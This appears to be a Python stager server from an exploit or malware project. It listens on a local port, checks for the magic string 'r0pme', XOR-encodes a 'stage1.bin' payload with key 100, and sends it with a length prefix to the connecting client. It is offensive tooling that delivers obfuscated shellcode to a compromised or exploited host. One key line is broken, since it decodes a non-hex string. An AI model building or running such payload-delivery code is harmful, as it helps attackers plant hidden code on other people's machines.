import socket
import struct
import binascii

HOST = '192.168.1.5' 
PORT = 3495

def encrypt2(buf, key):
    obuf = []
    for i in range(len(buf)):
        obuf.append(buf[i] ^ key[i%len(key)])
    return bytearray(obuf)

def encrypt(buf, key):
    obuf = []
    for i in range(len(buf)):
        obuf.append(buf[i] ^ key)
    return bytearray(obuf)

with socket.socket() as s:
    s.bind((HOST, PORT))
    s.listen(1)
    conn, addr = s.accept()
    with conn:
        print("Connected by ", addr)
        #print("Recv'd ", conn.recv(1024))
        rcv = conn.recv(5)
        print("Recv'd ", rcv)
        if rcv == b'r0pme':
            with open("stage1.bin", 'rb') as stage1:
                stage1_buf = stage1.read()
                
                key = binascii.unhexlify("m4xpl0it")
                
                stage1_buf = encrypt(stage1_buf, 100)
                print(f"sent : {len(stage1_buf)} bytes")
                length = bytearray(struct.pack("<Q",len(stage1_buf)))
                conn.sendall(length)
                print("sent stage1")
                conn.sendall(stage1_buf)
                
        else:
            print("Error in input string")

